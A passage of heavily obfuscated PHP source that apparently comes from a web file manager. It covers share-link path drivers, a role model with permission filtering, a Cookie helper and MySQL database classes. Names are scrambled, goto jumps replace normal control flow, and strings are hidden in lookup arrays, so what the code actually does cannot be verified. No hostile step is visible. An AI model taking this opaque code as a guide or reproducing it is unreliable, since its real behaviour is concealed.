$A±ŞÕ«³Ù¦, !1); } $GLOBALS[$A²áÙöëè‚[1140]] = $bÛ‚Õ‘¹ó½[$A²áÙöëè‚[28]]; $d·Šì¦é¡ = $this->model->fileInfoGet($A±ŞÕ«³Ù¦); IO::fileOutImage($d·Šì¦é¡[$A²áÙöëè‚[75]], $A¤ÀŠ èÑ); } public function fileOutImage($C’¹šßÅ›æ, $a¦æ”½—ñŸ = 250) { $this->_fileOutImage($C’¹šßÅ›æ, $a¦æ”½—ñŸ); } public function fileOutImageServer($f½­Î¯Í, $f¶îË«ØØ = 250) { $this->_fileOutImage($f½­Î¯Í, $f¶îË«ØØ); } public function link($CŠ‡Åœò¾, $D‘¿„ÍŠóš = '') { $f‰ÖñÙ†Øæ = $this->model->fileInfoGet($CŠ‡Åœò¾); return IO::link($f‰ÖñÙ†Øæ[$_SERVER[ã®Â„Éæ¹¤][75]], $D‘¿„ÍŠóš); } protected function parse($aš‹Øê„î) { $B‘ÎƒÌ¯ò… =& $_SERVER[ã®Â„Éæ¹¤]; if (strstr($aš‹Øê„î, $B‘ÎƒÌ¯ò…[8]) === !1) { return array($B‘ÎƒÌ¯ò…[385] => intval($aš‹Øê„î), $B‘ÎƒÌ¯ò…[75] => $B‘ÎƒÌ¯ò…[33], $B‘ÎƒÌ¯ò…[1137] => array()); } $bÔŒÆì´»” = explode($B‘ÎƒÌ¯ò…[8], trim($aš‹Øê„î, $B‘ÎƒÌ¯ò…[8])); if (count($bÔŒÆì´»”) < 2) { show_tips($aš‹Øê„î . $B‘ÎƒÌ¯ò…[1142]); } return array($B‘ÎƒÌ¯ò…[385] => intval($bÔŒÆì´»”[0]), $B‘ÎƒÌ¯ò…[75] => $bÔŒÆì´»”[1], $B‘ÎƒÌ¯ò…[1137] => array_slice($bÔŒÆì´»”, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($díÒ­»÷¬ß) { $this->pathParse = $díÒ­»÷¬ß; $this->model = Model($_SERVER[ã®Â„Éæ¹¤][1136]); } public function getPathOuter($F¹Š•¯¸¸) { $aÆšÂ¼ëÂ =& $_SERVER[ã®Â„Éæ¹¤]; if (!$F¹Š•¯¸¸) { return $F¹Š•¯¸¸; } $f¤ÆÈÀ¿ª÷ = $this->parse($F¹Š•¯¸¸); return trim(KodIO::makeShare($this->pathParse[$aÆšÂ¼ëÂ[367]], $f¤ÆÈÀ¿ª÷[$aÆšÂ¼ëÂ[367]]), $aÆšÂ¼ëÂ[8]); } protected function infoParse($C°…ïö¡, $C¼š÷æã» = false, $AšèİåŒâ = false) { $Cà†±ñÉ‹ô =& $_SERVER[ã®Â„Éæ¹¤]; $eôšµÚÙº = $this->pathParse[$Cà†±ñÉ‹ô[367]]; $cÉˆ³ªñì = trim($this->pathParse[$Cà†±ñÉ‹ô[1031]], $Cà†±ñÉ‹ô[8]); return Action($Cà†±ñÉ‹ô[1143])->sharePathInfo($eôšµÚÙº, $cÉˆ³ªñì); } public function infoFull($fê“ËÜŠí‘) { $Bòˆ‰À£İ‰ =& $_SERVER[ã®Â„Éæ¹¤]; $a×ªßŸÌæ = explode($Bòˆ‰À£İ‰[8], trim($fê“ËÜŠí‘, $Bòˆ‰À£İ‰[8])); if (count($a×ªßŸÌæ) > 1) { $f•¢¥ââ = implode($Bòˆ‰À£İ‰[8], array_splice($a×ªßŸÌæ, 1)); $CŒ‘ÖíãõÈ = $this->model->pathInfoByPath($a×ªßŸÌæ[0], $f•¢¥ââ); if (!$CŒ‘ÖíãõÈ) { return !1; } $this->pathParse[$Bòˆ‰À£İ‰[1031]] = $CŒ‘ÖíãõÈ[$Bòˆ‰À£İ‰[369]]; } return $this->infoParse($fê“ËÜŠí‘); } public function listAll($BœêÈ­Å‘¯) { goto eæö¥Ã§Ã; b«“®Ö›Î: foreach ($FËÅ²âøğ… as &$a´îàÅ¶Ã) { check_abort(); $a´îàÅ¶Ã[$A°§–ºÄ˜Ã[391]] = $DºçÊÒ´Ú->_shareItemeParse($a´îàÅ¶Ã[$A°§–ºÄ˜Ã[391]], $aÉÊ®í˜ã¼); } unset($a´îàÅ¶Ã); return $FËÅ²âøğ…; goto bÙçÍ÷‹â; eæö¥Ã§Ã: $A°§–ºÄ˜Ã =& $_SERVER[ã®Â„Éæ¹¤]; $BŸÏ©„äˆš = IO::info($this->pathParse[$A°§–ºÄ˜Ã[75]]); if (!$BŸÏ©„äˆš) { return array(); } goto bœ˜ê§ù”¨; bœ˜ê§ù”¨: $FËÅ²âøğ… = $this->model->listAll($BœêÈ­Å‘¯); $aÉÊ®í˜ã¼ = Model($A°§–ºÄ˜Ã[537])->getInfo($BŸÏ©„äˆš[$A°§–ºÄ˜Ã[441]]); $DºçÊÒ´Ú = Action($A°§–ºÄ˜Ã[1143]); goto b«“®Ö›Î; bÙçÍ÷‹â: } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($d¤‹»Éë»ø) { $this->pathParse = $d¤‹»Éë»ø; $this->model = Model($_SERVER[ã®Â„Éæ¹¤][1136]); } protected function infoParse($E¥ ¢˜©Á, $C©äö˜¸Õ = false, $B³†®ñ¼šó = false) { $c›µŒÜ¡œ =& $_SERVER[ã®Â„Éæ¹¤]; return Action($c›µŒÜ¡œ[1037])->sharePathInfo($this->pathParse[$c›µŒÜ¡œ[75]], !0); } public function listPath($Bİò†Œ„õ, $dÎ¬ç‰†² = false) { $bšÃäò£†ª =& $_SERVER[ã®Â„Éæ¹¤]; $Cßë©Ì“ó— = parent::listPath($Bİò†Œ„õ, $dÎ¬ç‰†²); foreach ($Cßë©Ì“ó— as $EóªÈù©Ïô => $F¥é©ìáîÌ) { if (!in_array($EóªÈù©Ïô, array($bšÃäò£†ª[73], $bšÃäò£†ª[74]))) { continue; } foreach ($F¥é©ìáîÌ as $AËÕåĞ±šá => $a£ˆß´±–É) { $Cßë©Ì“ó—[$EóªÈù©Ïô][$AËÕåĞ±šá] = Action($bšÃäò£†ª[1037])->shareItemInfo($a£ˆß´±–É); } } return $Cßë©Ì“ó—; } public function listAll($eøä†¾±ó) { goto A³Š‚’å¤È; A³Š‚’å¤È: $e£ğÍÙÃŒ =& $_SERVER[ã®Â„Éæ¹¤]; $Féë¿Ñõ„ = IO::info($this->pathParse[$e£ğÍÙÃŒ[75]]); if (!$Féë¿Ñõ„) { return array(); } goto E»¼£Ÿƒå»; E»¼£Ÿƒå»: $C“–†…‚Šğ = $this->model->listAll($eøä†¾±ó); foreach ($C“–†…‚Šğ as &$C¨«ø½á„ ) { $C¨«ø½á„ [$e£ğÍÙÃŒ[391]] = Action($e£ğÍÙÃŒ[1037])->shareItemInfo($C¨«ø½á„ [$e£ğÍÙÃŒ[391]]); } unset($C¨«ø½á„ ); goto E¶¿ÄÂõ¦; E¶¿ÄÂõ¦: return $C“–†…‚Šğ; goto Eº“¯¶¸ø°; Eº“¯¶¸ø°: } } goto bô•²…°‡; cÃéÉšíÁ©: function beforeShutdownFatalError($Cî‡Ñ§§„ò) { think_exception($Cî‡Ñ§§„ò); } $_SERVER[$_SERVER[ˆó©™¯í›][45]] = $AÃ˜ùÔÚƒö($_SERVER[$_SERVER[ˆó©™¯í›][42]]); $D‘‰ÂàŞ„ = E_ALL ^ E_NOTICE ^ E_WARNING ^ E_DEPRECATED; goto AŒïÄ¿³Šğ; CÊœö†‡ñ†: define($_SERVER[ã®Â„Éæ¹¤][227], 2); define($_SERVER[ã®Â„Éæ¹¤][228], 3); define($_SERVER[ã®Â„Éæ¹¤][229], 1); goto dç±…À®ÔÈ; fâ”±ÆÊ: class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\x79\x73\x74\145\155\x5f\157\x70\x74\x69\157\156"; protected $jsonField = array("\x6d\x65\x6e\165", "\162\x6f\x6c\x65", "\162\157\154\145\x47\x72\157\165\x70", "\162\x65\x67\x69\163\164", "\x65\x6d\141\151\x6c"); function __construct() { parent::__construct(); } protected function cacheKey($ağå¿£ÄÌÍ) { return "\123\x79\x73\164\x65\x6d\117\x70\x74\151\157\x6e\x5f{$ağå¿£ÄÌÍ}"; } protected function optionDefault($Bø ™í‚ = '') { $e¥º–áå =& $_SERVER[ã®Â„Éæ¹¤]; if ($Bø ™í‚ == $e¥º–áå[33]) { return $GLOBALS[$e¥º–áå[6]][$e¥º–áå[2532]]; } } } class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\x65\155\x2e\162\157\154\145\114\x69\163\x74"; public $field = array("\156\x61\155\x65", "\x61\165\x74\x68", "\154\141\142\x65\x6c", "\144\x69\x73\x70\x6c\x61\171", "\x73\171\x73\164\x65\x6d", "\144\x65\x73\x63", "\151\x67\x6e\x6f\162\145\105\x78\x74", "\151\x67\156\x6f\x72\145\x46\x69\x6c\145\x53\151\172\145", "\141\x64\x6d\x69\x6e\x69\x73\x74\x72\x61\164\157\162", "\163\157\162\164"); public function listData($dÓêİÛÂùç = false, $b›‘¹ï–ö = "\x73\157\162\164", $C°Ú†Ãó· = false) { $AÄ•‘÷Õß =& $_SERVER[ã®Â„Éæ¹¤]; $d¨‹Èèƒ® = parent::listData($dÓêİÛÂùç, $b›‘¹ï–ö, $C°Ú†Ãó·); if (!$dÓêİÛÂùç) { $aëÀ½²š³ã = $AÄ•‘÷Õß[2533]; foreach ($d¨‹Èèƒ® as $b‡ÇùÅÛ§å => $CâæìÁô£ô) { if ($CâæìÁô£ô[$AÄ•‘÷Õß[2313]] == 1) { $d¨‹Èèƒ®[$b‡ÇùÅÛ§å][$AÄ•‘÷Õß[405]] = $aëÀ½²š³ã; } } } return $d¨‹Èèƒ®; } public function update($E–íËˆ®ö, $c¼±–´×ÙÂ) { goto aëˆäàù; aëˆäàù: $bÀ×òá˜ =& $_SERVER[ã®Â„Éæ¹¤]; $AÑ¶øÔÆ–¦ = parent::listData($E–íËˆ®ö); $FóÔô¿¿í» = $this->findByName($c¼±–´×ÙÂ[$bÀ×òá˜[28]]); goto cò„ß÷©â; cò„ß÷©â: if (!$AÑ¶øÔÆ–¦ || $FóÔô¿¿í» && $FóÔô¿¿í»[$bÀ×òá˜[367]] != $AÑ¶øÔÆ–¦[$bÀ×òá˜[367]]) { return !1; } if ($FóÔô¿¿í»[$bÀ×òá˜[2313]] == 1) { $c¼±–´×ÙÂ = array($bÀ×òá˜[28] => $c¼±–´×ÙÂ[$bÀ×òá˜[28]], $bÀ×òá˜[2147] => $c¼±–´×ÙÂ[$bÀ×òá˜[2147]]); } $this->filterAuth($c¼±–´×ÙÂ[$bÀ×òá˜[376]]); goto D•Ì¼î×¹è; D•Ì¼î×¹è: return parent::update($E–íËˆ®ö, $c¼±–´×ÙÂ); goto D‰¥áêÜ»; D‰¥áêÜ»: } public function remove($EÅÒí˜¼óó) { $C¶ì‚åã• = parent::listData($EÅÒí˜¼óó); if (!$C¶ì‚åã• || $C¶ì‚åã•[$_SERVER[ã®Â„Éæ¹¤][1099]]) { return !1; } return parent::remove($EÅÒí˜¼óó); } public function add($AˆÈ¥ö¼è¶) { goto f¸êº‰ğÙ¹; f¸êº‰ğÙ¹: $E±Û»†Ûµˆ =& $_SERVER[ã®Â„Éæ¹¤]; $aƒ§çäÜì• = $AˆÈ¥ö¼è¶[$E±Û»†Ûµˆ[28]]; if ($this->findByName($aƒ§çäÜì•)) { return !1; } goto d•§ïÈåÌ ; eñÕ’…³Šß: return parent::insert($AˆÈ¥ö¼è¶); goto bÒÔ„›Äçí; d•§ïÈåÌ : $FÒ‘§±§À¤ = array($E±Û»†Ûµˆ[386] => $aƒ§çäÜì•, $E±Û»†Ûµˆ[2133] => $E±Û»†Ûµˆ[33], $E±Û»†Ûµˆ[2129] => $E±Û»†Ûµˆ[2137], $E±Û»†Ûµˆ[2534] => 1, $E±Û»†Ûµˆ[2132] => 0, $E±Û»†Ûµˆ[2535] => 0, $E±Û»†Ûµˆ[2131] => $this->getSort()); $AˆÈ¥ö¼è¶ = array_merge($FÒ‘§±§À¤, $AˆÈ¥ö¼è¶); $this->filterAuth($AˆÈ¥ö¼è¶[$E±Û»†Ûµˆ[376]]); goto eñÕ’…³Šß; bÒÔ„›Äçí: } private function getSort() { $E‚óƒÒ°ÉÍ =& $_SERVER[ã®Â„Éæ¹¤]; $B™°„ÃÏß° = parent::listData(); $CÄ“´øƒ•‚ = array_to_keyvalue($B™°„ÃÏß°, $E‚óƒÒ°ÉÍ[33], $E‚óƒÒ°ÉÍ[2149]); return empty($CÄ“´øƒ•‚) ? 0 : max($CÄ“´øƒ•‚) + 1; } private function filterAuth(&$F‡›¼óŸÁ†) { $c¨ß®œ”¬Ø =& $_SERVER[ã®Â„Éæ¹¤]; $Dº¨ÖŸ­£ = array(); $b¹â¤Û®• = array_filter(explode($c¨ß®œ”¬Ø[47], $F‡›¼óŸÁ†)); foreach ($b¹â¤Û®• as $F‡›¼óŸÁ†) { $eñ›³øòÌ = explode($c¨ß®œ”¬Ø[91], $F‡›¼óŸÁ†); if ($eñ›³øòÌ[0] == $c¨ß®œ”¬Ø[1804] && $eñ›³øòÌ[1] != $c¨ß®œ”¬Ø[1055]) { $B„“¼º¯ğÊ = $eñ›³øòÌ[0] . $c¨ß®œ”¬Ø[91] . $eñ›³øòÌ[1] . $c¨ß®œ”¬Ø[2536]; if (!in_array($B„“¼º¯ğÊ, $b¹â¤Û®•)) { $Dº¨ÖŸ­£[] = $B„“¼º¯ğÊ; } } $Dº¨ÖŸ­£[] = $F‡›¼óŸÁ†; } $F‡›¼óŸÁ† = implode($c¨ß®œ”¬Ø[47], $Dº¨ÖŸ­£); } public function sort($Eˆ¶¡¿İÅ, $d‰‰õ·ÍÍ) { return parent::update($Eˆ¶¡¿İÅ, $d‰‰õ·ÍÍ); } } goto A•ƒìÒÑñ; b®à—ŒéÁö: class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($föê¼ÚÒ‰ = '', $dï®„ÜâÖà = 0) { if (is_string($föê¼ÚÒ‰) && $föê¼ÚÒ‰ != $_SERVER[ã®Â„Éæ¹¤][33]) { $this->prefix = $föê¼ÚÒ‰; } if (is_numeric($dï®„ÜâÖà) && $dï®„ÜâÖà > 0) { $this->expire = $dï®„ÜâÖà; } } public static function getInstance() { static $bİ–šÅ—ì­; if ($bİ–šÅ—ì­ === null) { $bİ–šÅ—ì­ = new self(); } return $bİ–šÅ—ì­; } private static $sameCookieSet = array(); public static function set($cƒÕ¸İØÅ, $bØŠ‘æùÆĞ, $aĞ§ËÄ°Ç = 0, $BŞÖ‡²¶¨¼ = false, $Cå³ˆè„¯‹ = false) { goto C¨‡íî’×Ä; C¨‡íî’×Ä: $CĞŒ†ÊÃÁ =& $_SERVER[ã®Â„Éæ¹¤]; if (!$aĞ§ËÄ°Ç) { $aĞ§ËÄ°Ç = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$cƒÕ¸İØÅ]) && self::$sameCookieSet[$cƒÕ¸İØÅ] == $bØŠ‘æùÆĞ . $aĞ§ËÄ°Ç) { return; } goto eÂÏŠÏÔï; eÂÏŠÏÔï: self::$sameCookieSet[$cƒÕ¸İØÅ] = $bØŠ‘æùÆĞ . $aĞ§ËÄ°Ç; if (!$Cå³ˆè„¯‹) { $Cå³ˆè„¯‹ = str_replace(HOST, $CĞŒ†ÊÃÁ[33], APP_HOST); $Cå³ˆè„¯‹ = _get($GLOBALS, $CĞŒ†ÊÃÁ[818], $Cå³ˆè„¯‹); } $F¡Ã©á¨‡ƒ = $CĞŒ†ÊÃÁ[33]; goto a…¶ Şø‹â; a…¶ Şø‹â: setcookie($cƒÕ¸İØÅ, $bØŠ‘æùÆĞ, time() + $aĞ§ËÄ°Ç, $CĞŒ†ÊÃÁ[8] . trim($Cå³ˆè„¯‹, $CĞŒ†ÊÃÁ[8]) . $F¡Ã©á¨‡ƒ, !1, !1, $BŞÖ‡²¶¨¼); goto c”ñÛƒîáÄ; c”ñÛƒîáÄ: } public static function setSafe($CØ‡¹¤×’, $a—ñ‹ĞÑ‰Ã, $c’éõîŠ«¦ = 0) { self::set($CØ‡¹¤×’, $a—ñ‹ĞÑ‰Ã, $c’éõîŠ«¦, !0); } public static function get($b†¸»¦‚©) { return isset($_COOKIE[$b†¸»¦‚©]) ? $_COOKIE[$b†¸»¦‚©] : !1; } public static function remove($dœ”¶áêÄø, $B‹³…„…ä‘ = false) { unset($_COOKIE[$dœ”¶áêÄø]); self::set($dœ”¶áêÄø, $_SERVER[ã®Â„Éæ¹¤][33], 1, $B‹³…„…ä‘); } } class DbMysql extends Db { public function __construct($aÍ§Ù‡ó¶’ = '') { $D÷Ş“ÜíÖ™ =& $_SERVER[ã®Â„Éæ¹¤]; if (!extension_loaded($D÷Ş“ÜíÖ™[749])) { think_exception(think_lang($D÷Ş“ÜíÖ™[10]) . $D÷Ş“ÜíÖ™[819]); } if (!empty($aÍ§Ù‡ó¶’)) { $this->config = $aÍ§Ù‡ó¶’; if (empty($this->config[$D÷Ş“ÜíÖ™[13]])) { $this->config[$D÷Ş“ÜíÖ™[13]] = $D÷Ş“ÜíÖ™[33]; } } } public function connect($a¦‡ğö°ßµ = '', $EÌºßä¥ÕÎ = 0, $cÆãÔŞ©÷í = false) { $bÉ¢ä¢Şƒ =& $_SERVER[ã®Â„Éæ¹¤]; if (!isset($this->linkID[$EÌºßä¥ÕÎ])) { goto b«¥¥¡¯‹Ğ; b«¥¥¡¯‹Ğ: if (empty($a¦‡ğö°ßµ)) { $a¦‡ğö°ßµ = $this->config; } $eŠ¶İÃ½á = $a¦‡ğö°ßµ[$bÉ¢ä¢Şƒ[820]] . ($a¦‡ğö°ßµ[$bÉ¢ä¢Şƒ[821]] ? "\x3a{$a¦‡ğö°ßµ[$bÉ¢ä¢Şƒ[821]]}" : $bÉ¢ä¢Şƒ[33]); $A¬¼ŒÊ‚È = !empty($a¦‡ğö°ßµ[$bÉ¢ä¢Şƒ[13]][$bÉ¢ä¢Şƒ[14]]) ? $a¦‡ğö°ßµ[$bÉ¢ä¢Şƒ[13]][$bÉ¢ä¢Şƒ[14]] : $this->pconnect; goto E¬‚©¸°âÂ; B¸ŞßÎ¯‹õ: if (1 != think_config($bÉ¢ä¢Şƒ[18])) { unset($this->config); } goto f™ğ‘°‡Ğ; c¥Š‘±¯–´: mysql_query($bÉ¢ä¢Şƒ[824] . think_config($bÉ¢ä¢Şƒ[825]) . $bÉ¢ä¢Şƒ[55], $this->linkID[$EÌºßä¥ÕÎ]); if ($Dáò²¥ƒ½Ì > $bÉ¢ä¢Şƒ[826]) { mysql_query($bÉ¢ä¢Şƒ[827], $this->linkID[$EÌºßä¥ÕÎ]); } $this->connected = !0; goto B¸ŞßÎ¯‹õ; E¬‚©¸°âÂ: if ($A¬¼ŒÊ‚È) { $this->linkID[$EÌºßä¥ÕÎ] = mysql_pconnect($eŠ¶İÃ½á, $a¦‡ğö°ßµ[$bÉ¢ä¢Şƒ[822]], $a¦‡ğö°ßµ[$bÉ¢ä¢Şƒ[823]], 131072); } else { $this->linkID[$EÌºßä¥ÕÎ] = mysql_connect($eŠ¶İÃ½á, $a¦‡ğö°ßµ[$bÉ¢ä¢Şƒ[822]], $a¦‡ğö°ßµ[$bÉ¢ä¢Şƒ[823]], !0, 131072); } if (!$this->linkID[$EÌºßä¥ÕÎ] || !empty($a¦‡ğö°ßµ[$bÉ¢ä¢Şƒ[17]]) && !mysql_select_db($a¦‡ğö°ßµ[$bÉ¢ä¢Şƒ[17]], $this->linkID[$EÌºßä¥ÕÎ])) { think_exception(mysql_error()); } $Dáò²¥ƒ½Ì = mysql_get_server_info($this->linkID[$EÌºßä¥ÕÎ]); goto c¥Š‘±¯–´; f™ğ‘°‡Ğ: } return $this->linkID[$EÌºßä¥ÕÎ]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($fÈ•î”—Âù) { goto f†„÷˜ãÑ; aÚ‰Ï±»â¡: think_action_status($e‰›°Š®”‰[19], 1); think_status($e‰›°Š®”‰[20]); $this->queryID = mysql_query($fÈ•î”—Âù, $this->_linkID); goto d Ô…ºé—ø; f†„÷˜ãÑ: $e‰›°Š®”‰ =& $_SERVER[ã®Â„Éæ¹¤]; if (0 === stripos($fÈ•î”—Âù, $e‰›°Š®”‰[252])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); goto CÓ¶ºå•„¥; d Ô…ºé—ø: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } goto CÄØÅ’§Ÿ¾; CÓ¶ºå•„¥: if (!$this->_linkID) { return !1; } $this->queryStr = $fÈ•î”—Âù; if ($this->queryID) { $this->free(); } goto aÚ‰Ï±»â¡; CÄØÅ’§Ÿ¾: } public function execute($aâ¾ª¡ä) { goto f Îãß£Ùã; aÌæ—Ÿæƒ: $this->queryStr = $aâ¾ª¡ä; if ($this->queryID) { $this->free(); } think_action_status($f§¡Î˜[21], 1); goto fŠæ‘ù¢’; f Îãß£Ùã: $f§¡Î˜ =& $_SERVER[ã®Â„Éæ¹¤]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto aÌæ—Ÿæƒ; AÀ Ãßµô: if (!1 === $BçİÂë«¬) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } goto fß„®îÔ¾; fŠæ‘ù¢’: think_status($f§¡Î˜[20]); $BçİÂë«¬ = mysql_query($aâ¾ª¡ä, $this->_linkID); $this->debug(); goto AÀ Ãßµô; fß„®îÔ¾: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[ã®Â„Éæ¹¤][828], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $C×ÁÉéÜõ— = mysql_query($_SERVER[ã®Â„Éæ¹¤][829], $this->_linkID); $this->transTimes = 0; if (!$C×ÁÉéÜõ—) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $d¾ƒ„£¡æ = mysql_query($_SERVER[ã®Â„Éæ¹¤][830], $this->_linkID); $this->transTimes = 0; if (!$d¾ƒ„£¡æ) { $this->error(); return !1; } } return !0; } private function getAll() { $FæÌ×Ö®‰“ = array(); if ($this->numRows > 0) { while ($D¯©µ’…¯İ = mysql_fetch_assoc($this->queryID)) { $FæÌ×Ö®‰“[] = $D¯©µ’…¯İ; } mysql_data_seek($this->queryID, 0); } return $FæÌ×Ö®‰“; } public function getFields($AµÄàê¨Œò) { $BÇö§İ˜×î =& $_SERVER[ã®Â„Éæ¹¤]; $b–˜¦¸·ò = $this->query($BÇö§İ˜×î[831] . $this->parseKey($AµÄàê¨Œò)); $a”æ‹•ñÌÓ = array(); if ($b–˜¦¸·ò) { foreach ($b–˜¦¸·ò as $e—ìÍÄÃ…¡ => $Fª·ë…àùƒ) { $a”æ‹•ñÌÓ[$Fª·ë…àùƒ[$BÇö§İ˜×î[27]]] = array($BÇö§İ˜×î[28] => $Fª·ë…àùƒ[$BÇö§İ˜×î[27]], $BÇö§İ˜×î[29] => $Fª·ë…àùƒ[$BÇö§İ˜×î[30]], $BÇö§İ˜×î[31] => (bool) (strtoupper($Fª·ë…àùƒ[$BÇö§İ˜×î[32]]) === $BÇö§İ˜×î[832]), $BÇö§İ˜×î[34] => $Fª·ë…àùƒ[$BÇö§İ˜×î[35]], $BÇö§İ˜×î[36] => strtolower($Fª·ë…àùƒ[$BÇö§İ˜×î[37]]) == $BÇö§İ˜×î[38], $BÇö§İ˜×î[39] => strtolower($Fª·ë…àùƒ[$BÇö§İ˜×î[40]]) == $BÇö§İ˜×î[41]); } } return $a”æ‹•ñÌÓ; } public function getTables($FĞí‚±Û§ = '') { $Aæ½Ø„ì­™ =& $_SERVER[ã®Â„Éæ¹¤]; if (!empty($FĞí‚±Û§)) { $e‡„Œ¯Áó” = $Aæ½Ø„ì­™[833] . $FĞí‚±Û§; } else { $e‡„Œ¯Áó” = $Aæ½Ø„ì­™[834]; } $Dì’Àİá = $this->query($e‡„Œ¯Áó”); $eÀ¯³ñç»õ = array(); foreach ($Dì’Àİá as $dâ¡®¢‰´è => $a„§Óô»ø¾) { $eÀ¯³ñç»õ[$dâ¡®¢‰´è] = current($a„§Óô»ø¾); } return $eÀ¯³ñç»õ; } public function replace($fù£éÆ¬ÙÕ, $eæòÛÀä„ = array()) { $Fâ½‚£ö×Ó =& $_SERVER[ã®Â„Éæ¹¤]; foreach ($fù£éÆ¬ÙÕ as $BŞãÇ™§ç¸ => $C‡¬çµÏ•) { $däÙêÜ§¢° = $this->parseValue($C‡¬çµÏ•); if (is_scalar($däÙêÜ§¢°)) { $F¸°§Ñ©ôï[] = $däÙêÜ§¢°; $EË®”ˆ¶øâ[] = $this->parseKey($BŞãÇ™§ç¸); } } $AÚ¶¯Ù¾çš = $Fâ½‚£ö×Ó[835] . $this->parseTable($eæòÛÀä„[$Fâ½‚£ö×Ó[267]]) . $Fâ½‚£ö×Ó[836] . implode($Fâ½‚£ö×Ó[47], $EË®”ˆ¶øâ) . $Fâ½‚£ö×Ó[837] . implode($Fâ½‚£ö×Ó[47], $F¸°§Ñ©ôï) . $Fâ½‚£ö×Ó[838]; return $this->execute($AÚ¶¯Ù¾çš); } public function insertAll($EÂ©¤½–¹, $dÉ‘ÊÕ†Ô = array(), $c‰¶°Å˜£ = false) { goto DÄß™Ä”ó; Dã°¦Ğ‰å¢: $dÙğ­·¥É = array(); foreach ($EÂ©¤½–¹ as $fÍïÑáÁÁ¤) { $a¯¯ØíÒ¿ä = array(); foreach ($fÍïÑáÁÁ¤ as $Bæ„²“˜ê¯ => $aæÜ²´òâÙ) { $aæÜ²´òâÙ = $this->parseValue($aæÜ²´òâÙ); if (is_scalar($aæÜ²´òâÙ)) { $a¯¯ØíÒ¿ä[] = $aæÜ²´òâÙ; } } $dÙğ­·¥É[] = $e¤Å¥ÛŞÉ›[248] . implode($e¤Å¥ÛŞÉ›[47], $a¯¯ØíÒ¿ä) . $e¤Å¥ÛŞÉ›[838]; } array_walk($C¦ï­ƒª®¢, array($this, $e¤Å¥ÛŞÉ›[839])); goto AÍ¦†£À´í; DÄß™Ä”ó: $e¤Å¥ÛŞÉ› =& $_SERVER[ã®Â„Éæ¹¤]; if (!is_array($EÂ©¤½–¹[0])) { return !1; } $C¦ï­ƒª®¢ = array_keys($EÂ©¤½–¹[0]); goto Dã°¦Ğ‰å¢; AÍ¦†£À´í: $aÁ©òâÁ·Ø = ($c‰¶°Å˜£ ? $e¤Å¥ÛŞÉ›[840] : $e¤Å¥ÛŞÉ›[841]) . $e¤Å¥ÛŞÉ›[842] . $this->parseTable($dÉ‘ÊÕ†Ô[$e¤Å¥ÛŞÉ›[267]]) . $e¤Å¥ÛŞÉ›[836] . implode($e¤Å¥ÛŞÉ›[47], $C¦ï­ƒª®¢) . $e¤Å¥ÛŞÉ›[843] . implode($e¤Å¥ÛŞÉ›[47], $dÙğ­·¥É); return $this->execute($aÁ©òâÁ·Ø); goto b™ŠÛç¸Ÿ; b™ŠÛç¸Ÿ: } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $fÁğøÊ¸ˆ¼ =& $_SERVER[ã®Â„Éæ¹¤]; $this->error = mysql_errno() . $fÁğøÊ¸ˆ¼[4] . mysql_error($this->_linkID); if ($fÁğøÊ¸ˆ¼[33] != $this->queryStr) { $this->error .= LNG($fÁğøÊ¸ˆ¼[45]) . $this->queryStr; } think_trace($this->error, $fÁğøÊ¸ˆ¼[33], $fÁğøÊ¸ˆ¼[46]); return $this->error; } public function escapeString($f‹¶äõ´Ì™) { if ($this->_linkID) { return mysql_real_escape_string($f‹¶äõ´Ì™, $this->_linkID); } else { return mysql_escape_string($f‹¶äõ´Ì™); } } public function parseKey(&$e—‡ê±Ú, $F¦‰Íº®¸› = true) { $bÏ‘øÄ½â„ =& $_SERVER[ã®Â„Éæ¹¤]; if ($F¦‰Íº®¸›) { $e—‡ê±Ú = $this->parseKeyCheck($e—‡ê±Ú); } if ($e—‡ê±Ú != $bÏ‘øÄ½â„[176] && !preg_match($bÏ‘øÄ½â„[844], $e—‡ê±Ú)) { $e—‡ê±Ú = $bÏ‘øÄ½â„[845] . trim($e—‡ê±Ú, $bÏ‘øÄ½â„[845]) . $bÏ‘øÄ½â„[845]; } return $e—‡ê±Ú; } } class DbMysqli extends Db { public function __construct($C¶ÀËÊÕ£ = '') { $aŞêĞÊ‰Œ™ =& $_SERVER[ã®Â„Éæ¹¤]; if (!extension_loaded($aŞêĞÊ‰Œ™[748])) { think_exception(think_lang($aŞêĞÊ‰Œ™[10]) . $aŞêĞÊ‰Œ™[846]); } if (!empty($C¶ÀËÊÕ£)) { $this->config = $C¶ÀËÊÕ£; if (empty($this->config[$aŞêĞÊ‰Œ™[13]])) { $this->config[$aŞêĞÊ‰Œ™[13]] = $aŞêĞÊ‰Œ™[33]; } } } public function connect($dÇÈŒÖƒÒß = '', $A¿‡ä‡³Òö = 0) { $bµ¾¹Õ¾É¯ =& $_SERVER[ã®Â„Éæ¹¤]; if (!isset($this->linkID[$A¿‡ä‡³Òö])) { goto c¥”îˆÑâ; EòŒ…ñÜÑÕ: $fº«‰’âÚº = $this->linkID[$A¿‡ä‡³Òö]->server_version; $this->linkID[$A¿‡ä‡³Òö]->query($bµ¾¹Õ¾É¯[824] . think_config($bµ¾¹Õ¾É¯[825]) . $bµ¾¹Õ¾É¯[55]); if ($fº«‰’âÚº > $bµ¾¹Õ¾É¯[826]) { $this->linkID[$A¿‡ä‡³Òö]->query($bµ¾¹Õ¾É¯[827]); } goto BÊ›÷ÀÖÏ‚; BÊ›÷ÀÖÏ‚: 